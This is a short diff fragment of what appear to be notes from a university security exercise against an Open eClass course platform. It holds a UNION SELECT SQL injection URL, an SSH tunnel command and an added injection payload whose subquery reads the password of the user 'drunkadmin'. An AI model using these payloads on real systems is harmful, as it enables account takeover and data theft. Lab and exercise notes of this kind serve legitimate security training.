@@ -50,3 +50,8 @@ http://eponymous.csec.gr/modules/work/work.php?id=2%27%20AND%202=3%20UNION%20SEL
 
 ssh -v -N -L 3307:localhost:11255 Eponymous@Eponymous.csec.gr
 ./squirrel-sql.sh &
+
+
+
+
+mpampas', (SELECT password from eclass.user where username='drunkadmin'), 'sqlinjectionok2', 'db14b2d829b695b67ba5f65a7e7d14cf', 'xss@xss.xss','5','1','123',1523109529,1649253529,'el')-- --
